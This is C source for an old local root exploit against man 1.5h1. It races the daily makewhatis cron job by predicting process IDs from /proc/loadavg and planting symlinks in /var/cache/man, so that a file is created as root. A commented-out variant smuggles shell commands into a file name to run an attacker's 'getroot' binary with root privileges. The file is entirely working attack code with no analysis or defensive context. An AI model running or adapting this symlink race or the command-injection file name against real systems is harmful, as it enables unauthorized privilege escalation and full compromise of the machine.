// man 1.5h1 - uid 0 (root) from gid 15 (man) via 
// /etc/cron.daily/makewhatis.cron and /usr/sbin/makewhatis
// - zen-parse 5/13/2001

#include <unistd.h>
#include <stdio.h>

#define TOCREATE "/etc/vulnerable-to-root-exploit-via-man"
//kiddies//
//#define TOCREATE "/usr/share/man/man1/ls.1.gz;cd ..;cd ..;cd ..;cd ..;cd tmp;export PATH=.;getroot;echo .1.gz"
/////////

int cow(char*s)
{
 int pid;
 if(sscanf(s,"%*s %*s %*s %*s %d",&pid)!=1)
 {
  printf("Something is screwy with /proc/loadavg.\n");
  exit(3);
 }
 return pid;
}

char *milkshake(int pid,char*s)
{
 sprintf(s,"/var/cache/man/whatis%d",pid);
 return s;
}

main()
{
 FILE *procf;
 char procs[1024];
 char evillink[1024];
 int curpid,lastpid;
 if (access("/var/cache/man/",W_OK))
 {
  printf("u need write access to /var/cache man. try manners.c\n");
  printf("to get gid man, then run this program again.\n");
  exit(1);
 }
 if(!(procf=fopen("/proc/loadavg","r"))) 
 {
  printf("opening /proc/loadavg failed.\n");
  printf("this exploit won't work without it.\n");
  exit(2);
 }
 fgets(procs,1024,procf);
 fclose(procf);
 lastpid=cow(procs);
 while(access(TOCREATE,R_OK))
 {
  procf=fopen("/proc/loadavg","r");
  fgets(procs,1024,procf);
  fclose(procf);
  for(curpid=cow(procs);lastpid<=curpid;lastpid++)
  {
   symlink(TOCREATE,milkshake(lastpid,evillink));
  }
 }
}
